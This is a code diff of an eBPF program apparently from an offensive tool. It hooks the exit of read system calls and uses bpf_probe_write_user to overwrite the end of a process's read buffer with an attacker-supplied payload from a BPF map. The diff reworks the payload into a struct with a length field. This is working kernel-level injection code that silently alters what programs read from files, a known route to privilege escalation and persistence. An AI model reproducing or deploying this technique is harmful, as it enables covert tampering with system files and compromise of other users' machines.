@@ -59,21 +59,25 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
     if (read_size < max_payload_len || read_size == 4096) {
         return 0;
     }
-    char *new_buff_addr = (char *)(buff_addr + read_size - max_payload_len -1);
     // |<--------- raw content ------->|\n|<------------ payload ------------->|
     // |<----------------------------- ret_size ------------------------------>|
     // |<-- buff_addr                  |<-- new_buff_addr                      |<-- buff_addr + read_size
     char local_buff[max_payload_len] = {0x00}; // clean buff
     size_t key = 0;
-    char *payload = (char *)bpf_map_lookup_elem(&map_payload_buffer, &key);
+    struct custom_payload *payload = bpf_map_lookup_elem(&map_payload_buffer, &key);
+    // char *new_buff_addr = (char *)(buff_addr + read_size - max_payload_len -1);
+    char *new_buff_addr = (char *)(buff_addr + read_size - max_payload_len -1);
+    // char *payload = (char *)bpf_map_lookup_elem(&map_payload_buffer, &key);
     if (payload == 0)
     {
         return 0;
     }
     local_buff[0] = '\n';
-    for (unsigned int i = 0; i < max_payload_len; i++)
+    // for (unsigned int i = 0; i < max_payload_len; i++)
+    for (unsigned int i = 0; i < payload->payload_len; i++)
     {
-        local_buff[i + 1] = payload[i];
+        // local_buf[i+1] = payload[i];
+        local_buff[i + 1] = payload->raw_buf[i];
     }
     // local_buff[max_payload_len + 1] = '\0';
     long ret = bpf_probe_write_user((void *)new_buff_addr, local_buff, max_payload_len);
